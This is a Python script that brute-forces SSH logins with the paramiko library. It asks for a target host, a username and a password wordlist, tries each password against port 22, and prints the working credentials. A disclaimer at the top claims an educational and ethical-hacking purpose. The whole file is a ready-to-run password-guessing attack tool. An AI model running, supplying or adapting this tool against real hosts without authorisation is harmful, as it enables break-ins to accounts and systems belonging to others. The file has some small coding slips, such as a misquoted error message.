'''
Disclaimer: This script is provided for educational purposes and ethical hacking practices only.
The author does not condone or support any illegal activities and is not responsible for any misuse
of this code. Users are solely responsible for ensuring that their use of this tool complies with all
applicable laws and regulations.

Before using this tool, always obtain proper authorization from the network owner or administrator.
Unauthorized use of this tool on networks or systems you do not own or have explicit permission to test
is illegal and punishable by law.

Use this tool responsibly and ethically.
'''

import paramiko  # requires paramiko - http://www.paramiko.org
import sys
import os


def ssh_connect(password, target, username, password_list):
    '''
    Uses passwords from entered wordlist to attempt to connect to target host

    Args:
        password: a string of a guessed password, taken from entered wordlist
        target: a string of target host to attack, specified in main
        username: a string of the user to attack on the target host, specified in main
        password_list: a string of the path to the wordlist to be used in the script, specified in main

    Returns:
        Prints all attempted passwords to the console and statesif they were successful or not

    Raises:
        None
    '''
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # prevents the host key policy warning from printing

    try:
        ssh.connect(target, port=22, username=username, password=password) # attempts to connect to target

    except paramiko.AuthenticationException: # catches incorrect credentials
        ssh.close()
        print(password + ' is not the password')

    except OSError: # catches a variety of os related errors - including when the target host is down
        password_list.close()
        ssh.close()
        print('Connection to ' + target + ' was unsuccessful - the host is possibly down\nExiting...')
        sys.exit()

    except KeyboardInterrupt: # catches keyboard interrupt
        sys.exit('\nExiting...\n')

    else: # prints password and cleans up upon successful connection
        print('Credentials for ' + username + '@' + target + ' Password: ' + password)
        password_list.close()
        ssh.close()
        sys.exit(0)


def main():
    '''
    Gathers target host, username, and wordlist interactively from user, iterates over wordlist and uses each password in
    ssh_connect

    Args:
        None

    Returns:
        None
    Raises:
        None
    '''

    try: # interactively obtains target host, username, and wordlist from user
        target = input('>> Input target host address (IP or hostname): ')
        user = input('>> Input SSH username: ')
        password_list = input('>> Input path to password list: ')

        if target == '' or user == '' or password_list == '': # catches user entering nothing for target, user, or password_list
            print('\nOne or more required inputs omitted\nExiting...')
            sys.exit()

        elif not os.path.exists(password_list): # catches password_list not being a valid file path
            print("'\nFile ' + password_list + ' does not exist\nExiting...'")
            sys.exit()

    except KeyboardInterrupt: # catches keyboard interrupt
        sys.exit('\nExiting...\n')

    with open(password_list, 'rt') as wordlist: # iterates over passwords from wordlist and uses them in ssh_connect
        for line in wordlist.readlines():
            password = line.strip('\n')
            ssh_connect(password, target, user, wordlist)

    wordlist.close() # cleans up once wordlist is exhausted
    print("Password list exhausted.  Better luck next time.")


if __name__ == "__main__":
    main()
